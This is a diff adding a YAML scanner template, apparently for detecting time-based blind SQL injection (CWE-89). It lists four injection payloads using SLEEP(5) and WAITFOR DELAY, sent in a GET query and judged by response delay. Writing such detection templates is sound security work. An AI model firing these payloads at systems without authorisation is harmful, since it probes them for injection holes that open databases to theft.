@@ -1,0 +1,24 @@
+id: sqli-time-based
+name: SQL Injection (Time-Based Blind)
+severity: critical
+vulnerability_type: sqli
+owasp: "A03:2021 Injection"
+cwe: CWE-89
+description: Detects blind SQL injection via response time delay
+tags: [sqli, blind, time-based]
+
+payloads:
+  - "1' AND SLEEP(5)--"
+  - "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
+  - "1; WAITFOR DELAY '0:0:5'--"
+  - "1' OR SLEEP(5)--"
+
+request:
+  method: GET
+  inject_in: query
+
+matchers:
+  - type: time
+    value: "5.0"
+
+match_condition: or
